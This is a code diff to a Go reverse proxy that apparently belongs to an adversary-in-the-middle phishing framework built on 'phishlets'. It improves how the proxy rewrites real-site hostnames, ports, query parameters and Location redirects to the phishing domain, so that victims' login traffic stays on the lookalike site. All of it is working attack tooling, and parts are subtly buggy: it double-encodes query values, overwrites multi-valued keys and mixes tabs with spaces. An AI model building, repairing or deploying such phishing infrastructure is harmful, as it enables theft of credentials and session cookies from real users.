@@ -657,6 +657,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if len(qs) > 0 {
 						for gp := range qs {
 							for i, v := range qs[gp] {
+								v = p.replacePhishingDomainInValue(v)
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
 							}
 						}
@@ -945,10 +946,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
 			if err == nil {
-				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
-					r_url.Host = r_host
-					resp.Header.Set("Location", r_url.String())
-				}
+			    // log.Debug("Original Location header: %s", r_url.String())
+			    if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
+			        r_url.Host = r_host
+              new_location := r_url.String()
+			        resp.Header.Set("Location", new_location)
+			        // log.Info("Updated Location header: %s", new_location)
+			    } else {
+			        log.Warning("Failed to replace host in Location header: %s", r_url.String())
+			    }
 			}
 
 			// fix cookies
@@ -1518,17 +1524,35 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 			if err == nil {
 				for _, h := range hosts {
 					if strings.ToLower(u.Host) == h {
-						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
+						u.Host = sub_map[h]
 						break
 					}
 				}
+				// Check and replace in query parameters
+				q := u.Query()
+				for key, values := range q {
+					for _, value := range values {
+						decodedValue, err := url.QueryUnescape(value)
+						if err == nil {
+							for _, h := range hosts {
+								if strings.Contains(decodedValue, h) {
+									decodedValue = strings.Replace(decodedValue, h, sub_map[h], -1)
+									q.Set(key, url.QueryEscape(decodedValue))
+									break
+								}
+							}
+						}
+					}
+				}
+				u.RawQuery = q.Encode()
 			}
-			return s_url
+			return u.String()
 		}))
+
 		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
 			for _, h := range hosts {
 				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
-					s_url = strings.Replace(s_url, h, sub_map[h], 1)
+					s_url = strings.Replace(s_url, h, sub_map[h], -1)
 					break
 				}
 			}
@@ -1739,6 +1763,13 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 		prefix = "."
 		hostname = hostname[1:]
 	}
+	
+	host, port, err := net.SplitHostPort(hostname)
+	if err != nil {
+		host = hostname
+		port = ""
+	}
+	
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
@@ -1746,11 +1777,19 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
+				if host == combineHost(ph.orig_subdomain, ph.domain) {
+					phishedHost := combineHost(ph.phish_subdomain, phishDomain)
+					if port != "" {
+						phishedHost = net.JoinHostPort(phishedHost, port)
+					}
+					return prefix + phishedHost, true
 				}
-				if hostname == ph.domain {
-					return prefix + phishDomain, true
+				if host == ph.domain {
+					phishedHost := phishDomain
+					if port != "" {
+						phishedHost = net.JoinHostPort(phishedHost, port)
+					}
+					return prefix + phishedHost, true
 				}
 			}
 		}
@@ -1976,7 +2015,7 @@ func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
 func orPanic(err error) {
 	if err != nil {
 		panic(err)
-	}
+  }
 }
 
 func getContentType(path string, data []byte) string {
@@ -1996,4 +2035,11 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+func (p *HttpProxy) replacePhishingDomainInValue(value string) string {
+    if p.cfg.general.Domain != "" && p.cfg.general.Target != "" {
+        return strings.Replace(value, p.cfg.general.Domain, p.cfg.general.Target, -1)
+    }
+    return value
 }
